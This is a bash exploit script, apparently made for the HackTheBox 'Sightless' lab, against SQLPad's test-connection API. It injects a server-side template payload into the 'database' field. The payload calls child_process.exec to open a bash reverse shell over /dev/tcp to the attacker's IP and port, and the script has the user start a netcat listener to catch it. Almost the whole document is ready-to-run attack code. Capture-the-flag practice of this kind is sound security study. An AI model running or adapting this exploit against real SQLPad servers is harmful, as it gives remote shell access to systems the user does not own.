#!/bin/bash

# Inform the user to run netcat manually
echo "Please make sure to start a listener on your attacking machine using the command:"
echo "nc -lvnp 9001"
echo "Waiting for you to set up the listener..."

# Pause for confirmation from the user before continuing
read -p "Press [Enter] when you are ready..."

# Prompt the user for the target server and attacker's IP address
echo "Please provide the target host (e.g., sqlpad.sightless.htb): "; read TARGET
echo "Please provide your IP address (e.g., 10.10.16.3): "; read REVERSE_IP

# Set reverse port for connection
REVERSE_PORT=9001

# Prepare the POST data with the payload injected in the 'host' and 'database' fields
POST_DATA=$(cat <<EOF
{
  "name": "divineclown",
  "driver": "mysql",
  "data": {
    "host": "",
    "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
  },
  "host": "",
  "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
}
EOF
)

# Perform the POST request using curl to trigger the payload on the target server
curl -i -s -k -X POST -H "Host: $TARGET" -H "Accept: application/json" -H "Content-Type: application/json" -H "Origin: http://$TARGET" -H "Referer: http://$TARGET/queries/new" -H "Connection: keep-alive" --data-binary "$POST_DATA" "http://$TARGET/api/test-connection" > /dev/null

echo "Exploit sent. If everything went well, check your listener for a connection on port $REVERSE_PORT."
